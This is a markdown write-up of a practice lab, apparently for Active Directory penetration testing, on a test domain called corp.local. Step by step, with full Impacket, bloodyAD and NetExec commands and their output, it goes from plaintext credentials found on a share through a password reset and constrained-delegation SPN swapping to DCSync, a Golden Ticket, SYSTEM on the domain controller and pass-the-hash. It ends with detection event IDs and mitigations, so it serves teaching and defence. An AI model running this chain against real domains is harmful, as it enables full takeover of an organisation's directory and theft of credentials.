# Lab 07: Constrained Delegation → LDAP → DCSync → Golden Ticket

## Lab Notes

This lab uses a single Windows Server 2022 machine (DC01) for both the Domain Controller and the target server. In a real environment, the reporting service (`svc_report`) would sit on a separate server (REPORT01), and the delegation would be configured to `cifs/REPORT01`.

This simplification is intentional: the lab focuses on **Constrained Delegation (KCD)**, **SPN swapping**, **LDAP authentication via Kerberos**, **DCSync**, and **Golden Ticket** — from a low-privileged user to Domain Admin.

## Overview

A basic corporate Active Directory environment with intentionally introduced misconfigurations. Designed to practice **Constrained Delegation**, **SPN Swap**, **LDAP ACL modification**, **DCSync**, and **Golden Ticket**.

## Topology

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   DC01       │    │   WS01       │    │   Parrot     │
│ Win Server   │────│  Win 10/11   │────│   Parrot OS  │
│ 192.168.31.100│   │ 192.168.31.206│   │ 192.168.31.209│
│ DC + AD CS   │    │   Client     │    │   Attacker   │
└──────────────┘    └──────────────┘    └──────────────┘
```

## Environment

| Component | Version |
|-----------|---------|
| Domain Controller | Windows Server 2022 |
| Client | Windows 10/11 |
| Attacker | Parrot OS |
| Domain | corp.local |
| Subnet | 192.168.31.0/24 |

## Attack Chain

```
lowuser → Public share → report.conf → m.orlov
       → BloodHound → GenericAll → svc_report
       → ForceChangePassword → svc_report
       → getTGT.py → TGT svc_report
       → getST.py (S4U2Self + S4U2Proxy) → ST Administrator@cifs/DC01
       → getST.py -altservice ldap → ST Administrator@ldap/DC01
       → bloodyAD -k → LDAP session as Administrator
       → add dcsync svc_report → DCSync rights
       → secretsdump → krbtgt hash
       → ticketer.py → Golden Ticket
       → psexec.py → SYSTEM on DC01
```

## Accounts

| Name | Sam | Password | Group |
|------|-----|----------|-------|
| Low User | lowuser | Password1 | Domain Users |
| Mikhail Orlov | m.orlov | MOrlov_Backup2026! | IT Users |
| Reporting Service | svc_report | ReportSvc2026! | AppServices |
| Administrator | Administrator | — | Domain Admins |

## Shares

| Share | Access |
|-------|--------|
| Public | Domain Users (Read) |
| IT | IT Users (Change) |
| Finance | Finance Users (Change) |
| HR | HR Users (Change) |
| Sales | Sales Users (Change) |
| Management | Management Users (Change) |

## Vulnerabilities

| # | Vulnerability | Where | MITRE |
|---|---------------|-------|-------|
| 1 | Credentials in Files | Public share (report.conf) | T1552.001 |
| 2 | GenericAll ACL | m.orlov → svc_report | T1098 |
| 3 | Constrained Delegation | svc_report → cifs/DC01 | T1134.001 |
| 4 | SPN Swap | cifs/DC01 → ldap/DC01 | T1134.001 |
| 5 | LDAP ACL Modification | Administrator → add dcsync | T1098 |
| 6 | DCSync | svc_report → krbtgt | T1003.006 |
| 7 | Golden Ticket | krbtgt | T1558.001 |

## Attack Steps

### 1. Initial Access (lowuser → Public → report.conf)

**Goal:** find credentials in a publicly readable share.

Enumerate shares:

```bash
nxc smb 192.168.31.100 -u lowuser -p 'Password1' --shares
```

Output:

```
SMB  192.168.31.100  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local)
SMB  192.168.31.100  445  DC01  [+] corp.local\lowuser:Password1
SMB  192.168.31.100  445  DC01  [*] Enumerated shares
SMB  192.168.31.100  445  DC01  Share           Permissions     Remark
SMB  192.168.31.100  445  DC01  -----           -----------     ------
SMB  192.168.31.100  445  DC01  Public          READ,WRITE
```

Download files:

```bash
smbclient //192.168.31.100/Public -U lowuser%Password1
smb: \> ls
smb: \> get report.conf
smb: \> get report_script.ps1
smb: \> exit
cat report.conf
```

Output (report.conf):

```
User=CORP\m.orlov
Password=MOrlov_Backup2026!
```

**Result:** `m.orlov : MOrlov_Backup2026!`

### 2. Verify m.orlov Credentials

```bash
nxc smb 192.168.31.100 -u m.orlov -p 'MOrlov_Backup2026!'
```

Output:

```
SMB  192.168.31.100  445  DC01  [+] corp.local\m.orlov:MOrlov_Backup2026!
```

### 3. Enumerate m.orlov's ACLs (BloodHound)

```bash
bloodhound-python -d corp.local -u m.orlov -p 'MOrlov_Backup2026!' -ns 192.168.31.100 -c All
```

Load BloodHound and search for `m.orlov`:

![m.orlov GenericAll on svc_report](orlovGenerivsvc.png)

**Result:** `m.orlov` has **GenericAll** on `svc_report`. This allows us to reset `svc_report`'s password without knowing the current one.

### 4. Change svc_report's Password

```bash
bloodyAD --host 192.168.31.100 -d corp.local -u m.orlov -p 'MOrlov_Backup2026!' \
  set password svc_report 'ReportSvc2026New!'
```

Output:

```
[+] Password changed successfully!
```

Verify:

```bash
nxc smb 192.168.31.100 -u svc_report -p 'ReportSvc2026New!'
```

Output:

```
SMB  192.168.31.100  445  DC01  [+] corp.local\svc_report:ReportSvc2026New!
```

### 5. Enumerate svc_report's Delegation (BloodHound)

Now that we control `svc_report`, we enumerate its rights in BloodHound.

```
MATCH (n:User {name:"SVC_REPORT@CORP.LOCAL"})-[r]->(m) RETURN n,r,m
```

Output:

```
svc_report --[AllowedToDelegate]--> DC01.CORP.LOCAL
```

![svc_report AllowedToDelegate to DC01](AllowedToDelegate.png)

**Result:** `svc_report` has **Constrained Delegation** to `DC01.CORP.LOCAL` via `msDS-AllowedToDelegateTo`.

### 6. Get TGT for svc_report

```bash
getTGT.py corp.local/svc_report:ReportSvc2026New! -dc-ip 192.168.31.100
export KRB5CCNAME=svc_report.ccache
klist
```

Output:

```
Default principal: svc_report@CORP.LOCAL
Service principal: krbtgt/CORP.LOCAL@CORP.LOCAL
```

### 7. S4U2Self + S4U2Proxy → ST Administrator@ldap/DC01

```bash
getST.py -spn CIFS/DC01.corp.local -altservice ldap/DC01.corp.local \
  -impersonate Administrator \
  -k -no-pass -dc-ip 192.168.31.100 \
  'corp.local/svc_report'
```

Output:

```
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from CIFS/DC01.corp.local@CORP.LOCAL to ldap/DC01.corp.local@CORP.LOCAL
[*] Saving ticket in Administrator@ldap_DC01.corp.local@CORP.LOCAL.ccache
```

**Result:** ST `Administrator@ldap/DC01.corp.local`.

### 8. LDAP Authentication as Administrator

```bash
export KRB5CCNAME=Administrator@ldap_DC01.corp.local@CORP.LOCAL.ccache
bloodyAD --host DC01.corp.local -d corp.local -k get object Administrator
```

Output:

```
distinguishedName: CN=Administrator,CN=Users,DC=corp,DC=local
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local; ...
```

**Result:** LDAP session as `Administrator`.

### 9. Grant DCSync Rights to svc_report

```bash
bloodyAD --host DC01.corp.local -d corp.local -k add dcsync svc_report
```

Output:

```
[+] svc_report is now able to DCSync
```

### 10. DCSync

```bash
getTGT.py corp.local/svc_report:ReportSvc2026New! -dc-ip 192.168.31.100
export KRB5CCNAME=svc_report.ccache
secretsdump.py -k -no-pass corp.local/svc_report@DC01.corp.local -just-dc-user krbtgt
```

Output:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b666bb712258b47c988113381c9a091d:::
krbtgt:aes256-cts-hmac-sha1-96:bdb74e3cc906c583ac54aa896b2b425c7c146b673d76fb6d91fac62611040a4c
krbtgt:aes128-cts-hmac-sha1-96:822569edb09ab4f0a40bf7c65b29ff8b
```

**Result:**

- `krbtgt` NTLM hash = `b666bb712258b47c988113381c9a091d`
- `krbtgt` AES256 = `bdb74e3cc906c583ac54aa896b2b425c7c146b673d76fb6d91fac62611040a4c`

### 11. Golden Ticket

```bash
ticketer.py -nthash b666bb712258b47c988113381c9a091d \
  -domain-sid S-1-5-21-3294273248-732266639-3691972774 \
  -domain corp.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
klist
```

Output:

```
Default principal: Administrator@CORP.LOCAL
Valid starting       Expires              Service principal
09/20/2026 03:50:29  09/17/2036 03:50:29  krbtgt/CORP.LOCAL@CORP.LOCAL
```

**Result:** Golden Ticket with 10-year lifetime.

### 12. SYSTEM on DC01

```bash
psexec.py corp.local/Administrator@DC01.corp.local -k -no-pass
```

Output:

```
[*] Requesting shares on DC01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file SMUywutc.exe
[*] Opening SVCManager on DC01.corp.local.....
[*] Creating service iygT on DC01.corp.local.....
[*] Starting service iygT.....
Microsoft Windows [Version 10.0.20348.587]
C:\Windows\system32> whoami
nt authority\system
```

**Result:** Domain Admin achieved via Golden Ticket.

### 13. Pass-the-Hash (Verification)

```bash
evil-winrm -i 192.168.31.100 -u Administrator -H '7b71bee7907489b8dea9a06bab7917b2'
```

Output:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Result:** Pass-the-Hash works.

## Detection

| Attack | Event ID | Source |
|--------|----------|--------|
| SMB Share Enum | 5140 | DC Security Log |
| GenericAll Abuse | 4724 | DC Security Log |
| Constrained Delegation | 4741 | DC Security Log |
| SPN Swap | 4769 | DC Security Log |
| LDAP ACL Modification | 5136 | DC Security Log |
| DCSync | 4662 (Replicating Directory Changes) | DC Security Log |
| Golden Ticket | 4769 (Anomalous TGT) | DC Security Log |
| Pass-the-Hash | 4624 (Logon Type 3, NTLM) | DC Security Log |

**What to look for:**

- **4724** — password reset by unusual user (`m.orlov` → `svc_report`).
- **4741** — computer account created by non-admin.
- **4769** — TGS request for `ldap/DC01` from unusual user.
- **5136** — ACL modified by non-admin (`add dcsync`).
- **4662** — DCSync (Replicating Directory Changes).
- **4769** — TGT with 10-year lifetime (Golden Ticket).

## Mitigation

| Attack | Mitigation |
|--------|------------|
| Credentials in Files | No plaintext passwords on shares |
| GenericAll | Audit ACLs; least privilege |
| Constrained Delegation | Audit `msDS-AllowedToDelegateTo`; use RBCD instead |
| SPN Swap | Monitor TGS requests for unusual SPNs |
| LDAP ACL Modification | Audit ACL changes; restrict LDAP access |
| DCSync | Audit Replicating Directory Changes; don't grant to service accounts |
| Golden Ticket | Rotate krbtgt twice; monitor anomalous TGT lifetime |
| Pass-the-Hash | Disable NTLM; use Kerberos; Protected Users |

## Tools Used

- NetExec (`nxc`)
- Impacket (`getTGT.py`, `getST.py`, `secretsdump.py`, `ticketer.py`, `psexec.py`, `wmiexec.py`)
- BloodHound (`bloodhound-python`)
- bloodyAD
- smbclient

## References

- MITRE ATT&CK
- HackTricks — AD Methodology
- The Hacker Recipes
- SpecterOps — Certified Pre-Owned
- Impacket
- NetExec
- BloodyAD

## Status

**Complete** — chain from `lowuser` to Domain Admin via Constrained Delegation, SPN Swap, LDAP ACL Modification, DCSync, and Golden Ticket.

